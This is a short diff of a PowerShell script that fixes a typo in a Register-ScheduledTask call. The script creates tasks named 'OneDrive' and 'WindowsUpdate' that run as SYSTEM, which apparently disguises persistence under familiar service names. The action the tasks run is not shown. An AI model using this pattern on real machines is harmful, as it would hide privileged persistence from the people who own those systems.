@@ -36,7 +36,7 @@ function Gen-Info {
     
     $task_bravo = "OneDrive"
     if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
-        Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" - Force
+        Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
     }
     
     $task_charlie = "WindowsUpdate"
